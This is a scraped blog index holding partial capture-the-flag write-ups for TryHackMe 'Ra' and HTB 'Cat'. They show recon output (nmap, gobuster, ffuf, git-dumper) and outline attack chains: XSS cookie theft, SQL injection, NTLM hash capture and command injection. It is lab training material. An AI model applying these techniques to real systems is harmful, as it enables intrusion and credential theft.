linkForce.strength(0.2); \n            \n            arrows.filter(link =\u003e link.source.id === d.id).classed('glow', false);\n\n            d.pinned = true;\n            d3.select(this).select('.flowchart-pin-icon').style('display', 'block');\n        });\n\n    nodeGroups\n      .call(dragHandler)\n      .on('mouseover', (event, d) =\u003e {\n        \n        arrows.filter(link =\u003e link.source.id === d.id).classed('glow', true);\n      })\n      .on('mouseout', (event, d) =\u003e {\n        \n        arrows.filter(link =\u003e link.source.id === d.id).classed('glow', false);\n      })\n      .on('contextmenu', function(event, d) {\n        event.preventDefault();\n        \n        if (d.pinned) {\n          d.pinned = false;\n          d.fx = null; \n          d.fy = null;\n          d3.select(this).select('.flowchart-pin-icon').style('display', 'none');\n          simulation.alpha(0.3).restart(); \n        }\n      });\n\n    return { svg, zoom, g };\n  }\n\n  function wrapText(textElem, str, maxW) {\n    const words = str.split(/\\s+/), lineHeight = 12, x = 0;\n    textElem.text(null);\n    let line = [], tspan = textElem.append('tspan').attr('x', x);\n    for (const word of words) {\n        line.push(word);\n        tspan.text(line.join(' '));\n        if (tspan.node().getComputedTextLength() \u003e maxW \u0026\u0026 line.length \u003e 1) {\n            line.pop();\n            tspan.text(line.join(' '));\n            line = [word];\n            tspan = textElem.append('tspan').attr('x', x).attr('dy', `${lineHeight}px`).text(word);\n        }\n    }\n  }\n\n  if (document.readyState === 'loading') {\n    document.addEventListener('DOMContentLoaded', initFlowcharts);\n  } else {\n    initFlowcharts();\n  }\n})();\n\u003c/script\u003e\n\n\u003ch1 id=\"1-initial-access-ta0001\"\u003e1. Initial Access (TA0001)\u003c/h1\u003e\n\u003cp\u003eAs always, the first step is a thorough \u003ccode\u003enmap\u003c/code\u003e scan to see what we\u0026rsquo;re working with.\u003c/p\u003e","title":"TryHackMe - Crocc Crew WriteUp"},{"content":"Overview Ra is a Hard machine on TryHackme it started with exploiting a weak password reset mechanism on a web application. After finding employee names and guessing a security question based on a pet\u0026rsquo;s name found in an image file, we get our initial credentials. This leads us to an SMB share with an installer for a vulnerable Spark XMPP client.\nThe real challenge begins here: we have to set up a sandboxed environment to run the client, debug Java and audio errors within Docker, and finally exploit a Cross-Site Scripting (XSS) vulnerability (CVE-2020-12772) to capture another user\u0026rsquo;s NTLM hash.\nAfter cracking the hash, we get a shell as a user who is part of the Account Operators group. This group permission allows us to reset another user\u0026rsquo;s password, modify a script they own, and leverage a scheduled task that executes the script to gain command execution and ultimately a system shell.\nTarget IP 10.10.22.233 + − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Check Web (Reset Page) [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Scrape User Emails [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Validate via Kerbrute [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Find Lily + Image → \"Sparky\" [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Reset Lily's Password [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Access SMB → Grab Spark Installer [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Setup Spark in Docker [https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Exploit CVE-2020-12772 XSS [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Catch NTLM Hash with Responder [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Crack Hash → Get Buse Password [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as Buse via Evil-WinRM [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Find checkservers.ps1 Script [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Reset brittanycr's Password [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Inject command injection in hosts.txt [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Get SYSTEM Shell → Capture Root Flag Story:\n\u0026ldquo;You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!). Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?.\u0026rdquo;\n1. Reconnaissance (TA0043) As always, we kick things off with an nmap scan to see what we\u0026rsquo;re up against\n0xblivion@:ra ~ root@localhost:~# sudo nmap -sVC -oA nmap/ra 10.10.22.233 -vv # Nmap 7.95 scan initiated Mon Jul 7 10:18:12 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/ra -vv 10.10.22.233 Nmap scan report for 10.10.22.233 Host is up, received echo-reply ttl 125 (0.13s latency). Scanned at 2025-07-07 10:18:12 EDT for 102s Not shown: 979 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 125 Simple DNS Plus 80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0 |_http-title: Windcorp. |_http-server-header: Microsoft-IIS/10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-07-07 14:18:25Z) 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 125 464/tcp open kpasswd5? syn-ack ttl 125 593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 125 2179/tcp open vmrdp? syn-ack ttl 125 3268/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 125 3389/tcp open ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: WINDCORP | NetBIOS_Domain_Name: WINDCORP | NetBIOS_Computer_Name: FIRE | DNS_Domain_Name: windcorp.thm | DNS_Computer_Name: Fire.windcorp.thm | DNS_Tree_Name: windcorp.thm | Product_Version: 10.0.17763 |_ System_Time: 2025-07-07T14:18:54+00:00 |_ssl-date: 2025-07-07T14:19:33+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=Fire.windcorp.thm | Issuer: commonName=Fire.windcorp.thm | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-07-06T14:17:39 | Not valid after: 2026-01-05T14:17:39 | MD5: 6e17:c117:2e4b:a1ad:0b3a:1b48:b82e:a760 | SHA-1: 9281:bfd7:f2ad:5373:8204:8124:d95a:2a4a:9282:70f7 | -----BEGIN CERTIFICATE----- | MIIC5jCCAc6gAwIBAgIQFqZeNiOsS7xONsYOVUv+oTANBgkqhkiG9w0BAQsFADAc | MRowGAYDVQQDExFGaXJlLndpbmRjb3JwLnRobTAeFw0yNTA3MDYxNDE3MzlaFw0y | NjAxMDUxNDE3MzlaMBwxGjAYBgNVBAMTEUZpcmUud2luZGNvcnAudGhtMIIBIjAN | BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw/mMB77zSh9MEBmBU9lZFArRskth | xAg2mN/g2siWl4asufhCxMK+0rfsxuPd4PsrdA72ONoR2DPyoWesIJvZxMlOizCJ | Z6jiUjeNIXwEoWOaML+FWYOgtsz4XgyS0oazidKXAAU7+aODndqIniX8BVFBJ3zL | LUFZ+TcpzFWeb+Ndacc87Dj6tsMPH2SY6ns2w4YGTLk/x2CEBeZqbQNAehF+ktlv | J0EhLkT8EFSUtdRx449hLoLM52W7ablEk5PGvotmzjr5ZTgeyPR1u62y5BMzW1Ml | e3Wd2JezqWwJD4F8lIrUOffXOtijd6qqclqBX90q4vw9UgcbKqOkCCiIyQIDAQAB | oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN | AQELBQADggEBAFZhYT1jQyIWH5c6baktb7Y3eL61YgBc7A4yN4MLbRX5K4oIAhQC | A/aYTwySTWpSTUHShuaqlaSiDQhMzc5ytWmv0pg5DHqXbbESgX7MwI1q8HMCOOyf | /Ir1F1zSiNcN94tUxRbjMHTdy21E8ainEXohDd7gCmIFNVJH2LrE4oMAA5RpfTdC | Rhj+B016uUJLg3cShSitcG5W32dcV1uYFj3T/P9UeFDib6FzeX7GvBPT7RkXWPVR | fEzVHC/GEKUw0mggm0EidkNH7xP1U94afc641lvHtbPtiOgU1DCOGniL0QpyUcqW | 5pyXi3PC+70iRWK8KVXTSrCU7xdY1EwFJSQ= |_-----END CERTIFICATE----- 5222/tcp open jabber syn-ack ttl 125 |_ssl-date: 2025-07-07T14:19:34+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=fire.windcorp.thm | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm | Issuer: commonName=fire.windcorp.thm | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-05-01T08:39:00 | Not valid after: 2025-04-30T08:39:00 | MD5: b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7 | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae | -----BEGIN CERTIFICATE----- | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89 | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8 | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7 | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T | LucP |_-----END CERTIFICATE----- | fingerprint-strings: | RPCCheck: |_ | xmpp-info: | STARTTLS Failed | info: | stream_id: 41t586ui0i | errors: | invalid-namespace | (timeout) | unknown: | auth_mechanisms: | capabilities: | xmpp: | version: 1.0 | compression_methods: |_ features: 5269/tcp open xmpp syn-ack ttl 125 Wildfire XMPP Client | xmpp-info: | STARTTLS Failed | info: | features: | errors: | (timeout) | unknown: | capabilities: | xmpp: | auth_mechanisms: |_ compression_methods: 7070/tcp open http syn-ack ttl 125 Jetty 9.4.18.v20190429 |_http-server-header: Jetty(9.4.18.v20190429) |_http-title: Openfire HTTP Binding Service | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 7443/tcp open ssl/http syn-ack ttl 125 Jetty 9.4.18.v20190429 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | ssl-cert: Subject: commonName=fire.windcorp.thm | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm | Issuer: commonName=fire.windcorp.thm | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-05-01T08:39:00 | Not valid after: 2025-04-30T08:39:00 | MD5: b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7 | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae | -----BEGIN CERTIFICATE----- | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89 | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8 | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7 | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T | LucP |_-----END CERTIFICATE----- |_http-server-header: Jetty(9.4.18.v20190429) |_http-title: Openfire HTTP Binding Service 7777/tcp open socks5 syn-ack ttl 125 (No authentication; connection failed) | socks-auth-info: |_ No authentication 9090/tcp open hadoop-datanode syn-ack ttl 125 Apache Hadoop | hadoop-datanode-info: |_ Logs: jive-ibtn jive-btn-gradient | hadoop-tasktracker-info: |_ Logs: jive-ibtn jive-btn-gradient | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Site doesn't have a title (text/html). |_http-favicon: Unknown favicon MD5: E4888EE8491B4EB75501996E41AF6460 9091/tcp open ssl/hadoop-datanode syn-ack ttl 125 Apache Hadoop | hadoop-datanode-info: |_ Logs: jive-ibtn jive-btn-gradient |_http-title: Site doesn't have a title (text/html). |_http-favicon: Unknown favicon MD5: E4888EE8491B4EB75501996E41AF6460 | hadoop-tasktracker-info: |_ Logs: jive-ibtn jive-btn-gradient | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | ssl-cert: Subject: commonName=fire.windcorp.thm | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm | Issuer: commonName=fire.windcorp.thm | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-05-01T08:39:00 | Not valid after: 2025-04-30T08:39:00 | MD5: b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7 | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae | -----BEGIN CERTIFICATE----- | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89 | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8 | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7 | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T | LucP |_-----END CERTIFICATE----- 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port5222-TCP:V=7.95%I=7%D=7/7%Time=686BD745%P=x86_64-pc-linux-gnu%r(RPC SF:Check,9B,\"","permalink":"https://0xblivion.dev/posts/thm/hard/tryhackme-ra-writeup/","summary":"\u003ch1 id=\"overview\"\u003eOverview\u003c/h1\u003e\n\u003cimg src=\"/img/RA/RA.png\" alt=\"\" class=\"img-responsive\" loading=\"lazy\" /\u003e\n\u003cp\u003eRa is a \u003ccode\u003eHard\u003c/code\u003e machine on \u003ccode\u003eTryHackme\u003c/code\u003e it started with exploiting a weak password reset mechanism on a web application. After finding employee names and guessing a security question based on a pet\u0026rsquo;s name found in an image file, we get our initial credentials. This leads us to an SMB share with an installer for a vulnerable Spark XMPP client.\u003c/p\u003e\n\u003cp\u003eThe real challenge begins here: we have to set up a sandboxed environment to run the client, debug Java and audio errors within Docker, and finally exploit a Cross-Site Scripting (\u003ccode\u003eXSS\u003c/code\u003e) vulnerability (\u003ccode\u003eCVE-2020-12772\u003c/code\u003e) to capture another user\u0026rsquo;s NTLM hash.\u003c/p\u003e","title":"TryHackMe - Ra WriteUp"},{"content":"Overview This box focuses on web application vulnerabilities, specifically Cross-Site Scripting (XSS) and SQL Injection, leading to privilege escalation. We start with an Nmap scan to identify open ports and services. We then enumerate the web application, discovering an exposed Git repository and an XSS vulnerability in the cat registration feature. Exploiting the XSS allows us to capture an admin session cookie, granting access to an administrative panel. From there, we identify and exploit a SQL Injection vulnerability to dump user credentials, which leads to SSH access as a low-privileged user. Finally, we leverage another XSS vulnerability within a local Gitea instance, triggered by an internal mail service, to compromise a higher-privileged user and obtain the root flag.\nTarget IP 10.10.11.53 + − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Access .git Directory [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Dump Source Code (config.php, contest.php) [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Find XSS in Cat Registration [https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Exploit XSS → Steal Admin Cookie [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Access Admin Panel → SQL Injection [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Dump Users → Crack rosa Password [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]SSH as rosa [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Read Apache Logs → Get axel Password [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]SSH as axel [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Access Gitea on localhost:3000 [https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Stored XSS in Repo Description [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Exfil index.php → Discover Root Creds [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]SU to root → Capture Root Flag 1. Kicking Off with Nmap As always, we start with an nmap scan to see what services are running on the target.\n0xblivion@cat: ~ root@localhost:~# sudo nmap -sVC -oA nmap/cat 10.10.11.53 -vv Nmap 7.95 scan initiated Thu Jul 3 22:46:57 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/cat -vv 10.10.11.53 Nmap scan report for 10.10.11.53 Host is up, received echo-reply ttl 63 (0.055s latency). Scanned at 2025-07-03 22:46:57 EDT for 9s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/7/gBYFf93Ljst5b58XeNKd53hjhC57SgmM9qFvMACECVK0r/Z11ho0Z2xy6i9R5dX2G/HAlIfcu6i2QD9lILOnBmSaHZ22HCjjQKzSbbrnlcIcaEZiE011qtkVmtCd2e5zeVUltA9WCD69pco7BM29OU7FlnMN0iRlF8u962CaRnD4jni/zuiG5C2fcrTHWBxc/RIRELrfJpS3AjJCgEptaa7fsH/XfmOHEkNwOL0ZK0/tdbutmcwWf9dDjV6opyg4IK73UNIJSSak0UXHcCpv0GduF3fep3hmjEwkBgTg/EeZO1IekGssI7yCr0VxvJVz/Gav+snOZ/A1inA5EMqYHGK07B41+0rZo+EZZNbuxlNw/YLQAGuC5tOHt896wZ9tnFeqp3CpFdm2rPGUtFW0jogdda1pRmRy5CNQTPDd6kdtdrZYKqHIWfURmzqva7byzQ1YPjhI22cQ49M79A0yf4yOCPrGlNNzeNJkeZM/LU6p7rNJKxE9CuBAEoyh0= | 256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmL+UFD1eC5+aMAOZGipV3cuvXzPFlhqtKj7yVlVwXFN92zXioVTMYVBaivGHf3xmPFInqiVmvsOy3w4TsRja4= | 256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOCpb672fivSz3OLXzut3bkFzO4l6xH57aWuSu4RikE 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://cat.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 3 22:47:06 2025 -- 1 IP address (1 host up) scanned in 9.39 seconds copy The scans reveal port 22/tcp which is SSH and a web server on 80/tcp using Apache. Nmap confirms this is a Linux (Ubuntu) machine.\nThe HTTP service on port 80 shows a redirect to cat.htb, so we should add this to our /etc/hosts file.\n0xblivion@cat: ~ root@localhost:~# echo \"10.10.11.53 cat.htb\" | sudo tee -a /etc/hosts copy 2. Gaining Initial Access Footprinting \u0026amp; Exploring the Site Visiting http://cat.htb/ in a browser, we see a website dedicated to a cat competition.\nWappalyzer confirms the site is running Apache HTTP Server on Ubuntu and uses PHP.\nExploring the site: The Vote page (http://cat.htb/vote.php) indicates voting is closed and buttons are unresponsive.\nThe Contest page redirects to http://cat.htb/join.php, where we can register a new user.\nAfter registering, we can access contest.php to register a cat, which involves providing a cat name, age, birthdate, weight, and photo. This looks like a potential area for vulnerabilities like XSS or file upload exploits.\nBut assumptions can lead us into rabbithole. Let\u0026rsquo;s try to recon.\nWeb Enumeration We run gobuster to enumerate directories and files on the web server.\n0xblivion@cat: ~ root@localhost:~# gobuster dir -u http://cat.htb/ -w /opt/SecLists/Discovery/Web-Content/common.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://cat.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.git (Status: 301) [Size: 301] [--\u003e http://cat.htb/.git/] /.git/HEAD (Status: 200) [Size: 23] /.git/config (Status: 200) [Size: 92] /.git/logs/ (Status: 403) [Size: 272] /.git/index (Status: 200) [Size: 1726] /.htaccess (Status: 403) [Size: 272] /.htpasswd (Status: 403) [Size: 272] /.hta (Status: 403) [Size: 272] /admin.php (Status: 302) [Size: 1] [--\u003e /join.php] /css (Status: 301) [Size: 300] [--\u003e http://cat.htb/css/] /img (Status: 301) [Size: 300] [--\u003e http://cat.htb/img/] /index.php (Status: 200) [Size: 3075] /server-status (Status: 403) [Size: 272] /uploads (Status: 301) [Size: 304] [--\u003e http://cat.htb/uploads/] Progress: 4750 / 4750 (100.00%) =============================================================== Finished =============================================================== copy The gobuster scan reveals an exposed .git/ repository and an admin.php page that redirects to join.php. We\u0026rsquo;ll focus on the .git directory and keep admin.php in mind.\nWe also run gobuster with the -x php flag and a larger wordlist to find more PHP files.\n0xblivion@cat: ~ root@localhost:~# gobuster dir -u http://cat.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt -x php =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://cat.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 272] /admin.php (Status: 302) [Size: 1] [--\u003e /join.php] /.html (Status: 403) [Size: 272] ...SNIP... copy Subdomain Enumeration We perform subdomain enumeration using ffuf to ensure we don\u0026rsquo;t miss any hidden attack vectors.\n0xblivion@cat: ~ root@localhost:~# ffuf -u http://cat.htb/ -H 'Host: FUZZ.cat.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fl 10 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://cat.htb/ :: Wordlist : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.cat.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response lines: 10 ________________________________________________ :: Progress: [19966/19966] :: Job [1/1] :: 716 req/sec :: Duration: [0:00:31] :: Errors: 0 :: copy The subdomain scan returns no interesting results.\nDumping .git/ using git-dumper We dump the exposed .git repository to analyze its contents.\n0xblivion@cat: ~ root@localhost:~# mkdir git-dump; git-dumper http://cat.htb/ git-dump/ [-] Testing http://cat.htb/.git/HEAD [200] [-] Testing http://cat.htb/.git/ [403] [-] Fetching common files [-] Fetching http://cat.htb/.gitignore [404] [-] Fetching http://cat.htb/.git/hooks/applypatch-msg.sample [200] [-] Fetching http://cat.htb/.git/COMMIT_EDITMSG [200] [-] http://cat.htb/.gitignore responded with status code 404 [-] Fetching http://cat.htb/.git/description [200] [-] Fetching http://cat.htb/.git/hooks/commit-msg.sample [200] [-] Fetching http://cat.htb/.git/hooks/post-commit.sample [404] ...SNIP... [-] Running git checkout . copy After dumping the repository, we list the files to see what we\u0026rsquo;ve obtained.\n0xblivion@cat: ~ 